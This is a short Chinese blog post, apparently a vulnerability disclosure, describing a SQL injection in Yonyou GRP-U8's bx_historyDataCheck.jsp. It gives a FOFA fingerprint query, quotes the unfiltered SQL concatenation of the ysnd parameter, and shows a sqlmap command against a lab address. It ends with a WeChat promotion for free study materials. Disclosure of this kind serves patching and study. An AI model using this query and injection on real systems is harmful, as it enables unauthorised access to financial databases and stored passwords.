# 原创
：  用友GRP-U8注入

# 用友GRP-U8注入

### 分享一个拿到CNDV证书的SQL注入，证书截图如下

##### 0x01 漏洞介绍

fofa：app=”用友-GRP-U8”<br/> 用友GRP-U8存在SQL注入，漏洞文件名为bx_historyDataCheck.jsp

##### 0x02 漏洞分析

文件截图如下<br/>  

<br/> 该文件接收3个传参，分别是userName，historyFlag，ysnd<br/> 由于接收传参后并未进行任何过滤，直接将ysnd及userName拼接sql语句进行查询，从而导致sql注入<br/> 先来看拼接语句<br/> sb.append(“select bm.bmdm,bm.bmmc,bm.gsdm,bm.kjnd,zy.zydm,zy.password,zy.zyxm from PUBBMXX bm left join PUBZYXX zy on bm.gsdm=zy.gsdm and bm.kjnd=zy.kjnd and bm.bmdm=zy.bmdm”+” where bm.kjnd=’”+ysnd+”‘ and zy.zydm = ‘“+userName+”‘“);<br/> 由于ysnd在语句前面，我们可以对ysnd进行sql注入测试，userName在后面是否传参均不影响测试<br/> 经过上述分析，直接对目标使用SQLMAP进行测试

##### 0x03 复现

构造sqlmap语句如下<br/> python3 sqlmap.py -u “[http://192.168.0.103:8888/u8qx/bx_historyDataCheck.jsp?ysnd=1](http://192.168.0.103:8888/u8qx/bx_historyDataCheck.jsp?ysnd=1)“<br/> 测试截图如下

复现完成

> 


**学习框架已经整理完毕，现在就差资料资源了，我这里整理了所有知识点对应的资料资源文档，大家不想一个一个去找的话，可以参考一下这些资料！**
**    点赞收藏评论区留言“已关注 求 ”！都可以免费分享给大家！等不及的小伙伴也可以直接厚台踢我！或者关注我之后后台会自动发送给大家！关注后大家注意看后台消息就行！**<br/>  


---


[+V【zkaq222】或者下面的扫码不然通不过哦，免费领取安全学习资料包！（私聊进群一起学习，共同进步）腾讯文档-在线文档<img alt="icon-default.png?t=N7T8" src="https://csdnimg.cn/release/blog_editor_html/release2.3.6/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N7T8"/>https://docs.qq.com/doc/DYmVETWlZemh0Ymdv](https://docs.qq.com/doc/DYmVETWlZemh0Ymdv)
